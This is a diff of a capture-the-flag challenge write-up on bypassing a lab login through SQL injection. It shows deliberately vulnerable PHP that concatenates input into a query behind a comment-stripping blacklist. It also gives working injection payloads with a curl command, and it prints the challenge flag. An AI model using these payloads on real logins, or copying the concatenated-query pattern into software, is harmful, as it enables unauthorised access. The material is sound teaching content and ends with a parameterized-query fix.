@@ -1,15 +1,17 @@
-# 🚪 Challenge 0 — Knock Twice, Walk Right In
+# 🚪 Challenge 0 — The Lock That Learned One Trick
 
 > **Vector:** SQL Injection (Authentication Bypass) · **Endpoint:** `POST /` (fields `username`, `password`)
 
-*(alt titles: "The Bouncer Can't Read" · "Comment Out the Bouncer" · "No Password? No Problem")*
+*(alt titles: "No Comment" · "The Bouncer Got a Memo" · "Think Past the Patch")*
+
+> 🎓 **Warm-up first:** try the guided demo at **`/demo`** — it teaches the classic comment trick. This real login has been *patched* against exactly that trick, so you'll need to adapt.
 
 ---
 
 ## 📝 Description
-The NIGHTFALL admin portal swears it's locked down — username, password, the works. But the bouncer at this door doesn't actually *check* your ID, he just repeats whatever you tell him straight to the database. Whisper the right words and the lock forgets it was ever there.
+The Sentinel admin portal still repeats whatever you type straight into its database — but someone "fixed" it by scrubbing out SQL comments. The comment trick from the demo now hits a wall. The underlying flaw is still wide open, though. You'll just have to *think past the patch*.
 
-Your mission: log in as **admin** without knowing the password. The door is at `POST /`. Slip past the guard and grab what's inside.
+Your mission: log in as **admin** without the password. The door is at `POST /`.
 
 ## 🧩 Vulnerable Code
 **`login-app/index.php`**
@@ -18,17 +20,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
 
-    // !!! VULNERABLE: user input concatenated straight into the SQL string.
-    // !!! No parameterization, no escaping.
-    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+    // "Hardening": strip SQL comment sequences so  admin'--  no longer works …
+    $strip = ['--', '#', '/*', '*/'];
+    $username = str_replace($strip, '', $username);   // ◀ comment trick neutralised
+    $password = str_replace($strip, '', $password);
 
-    $result = $db->query($query);
-    $user = $result ? $result->fetch(PDO::FETCH_ASSOC) : false;
+    // … but input is STILL concatenated into the query — boolean injection remains.
+    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";  // ◀ VULNERABLE
+
+    $user = $db->query($query)->fetch(PDO::FETCH_ASSOC);
     if ($user) {
-        // ✅ authenticated — session established, redirect to dashboard
         $_SESSION['authed'] = true;
         $_SESSION['user']   = $user['username'];
-        header('Location: /');
+        header('Location: /');   // ✅ authenticated
         exit;
     } else {
         $error = 'Invalid username or password.';
@@ -43,25 +47,32 @@ CTF{8ee4d84cbeef15123c24791da26006d9}
 *(from `flags/flag_login.txt`)*
 
 ## 💡 Hints
-- **Nudge:** The login form talks to the database using *exactly* what you type — nothing gets cleaned up first. What happens if your "username" contains a quote `'`?
-- **Warmer:** In SQL, `--` starts a comment. Everything after it on the line is ignored... including that pesky password check. 🤔
-- **The key:** Try username `admin'-- ` (trailing space) and any password.
+- **Nudge:** The comment trick (`admin'-- `) is dead — `--`, `#`, `/* */` are stripped before the query runs. But your input still lands *inside* the SQL. You don't need a comment to break logic.
+- **Warmer:** Instead of *commenting out* the password check, make the `WHERE` clause true another way. Remember SQL precedence: `AND` binds **tighter** than `OR`.
+- **Gotcha:** A bare `' OR '1'='1` **won't** work here — because of precedence it becomes `username='' OR ('1'='1' AND password='…')`, and the password half is still false. You must make the *username* side true.
+- **The key:** target admin directly so the OR wins regardless of the password:
   ```bash
+  # username field:
   curl -s -X POST "http://<host>/" \
-    --data-urlencode "username=admin'-- -" \
+    --data-urlencode "username=admin' OR '1'='1" \
     --data-urlencode "password=whatever"
+
+  # alt — inject in the PASSWORD field instead:
+  #   username=admin   password=' OR '1'='1
   ```
 
 ## 🔍 Vulnerable Line Explanation
-**`login-app/index.php:46`**
+**`login-app/index.php`** — comment sequences are stripped, *then* the raw input is still concatenated into the SQL:
 ```php
+$username = str_replace(['--','#','/*','*/'], '', $username);
 $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 ```
-Your raw input is dropped **directly into the SQL string** — no parameterization, no escaping. You're not *answering* the query, you get to *rewrite* it.
+Stripping comments only removes *one* exploitation path. Because the value is still placed inside the query, you can rewrite the boolean logic instead.
 
-| You send | Query becomes | Result |
+| You send (username) | Query becomes | Result |
 |---|---|---|
-| `admin'-- ` | `... WHERE username = 'admin'-- ' AND password = '...'` | `'` closes the string early, `-- ` comments out the whole password check → you're in as admin. |
-| `' OR '1'='1` | `... WHERE username = '' OR '1'='1' AND password = '...'` | `'1'='1'` is always true → returns the first user. |
+| `admin'-- ` | `… username = 'admin' AND password = '…'` | `--` removed → no comment → normal query → **fails** (wrong password). |
+| `' OR '1'='1` | `… username = '' OR '1'='1' AND password = '…'` | precedence → `'' OR ('1'='1' AND pw)` → pw false → **fails**. |
+| `admin' OR '1'='1` | `… username = 'admin' OR '1'='1' AND password = '…'` | `username='admin'` is true → `true OR (…)` → **logs in as admin** ✅ |
 
-**Fix:** parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.
+**Fix:** blacklisting characters/keywords is not a fix. Use a parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.
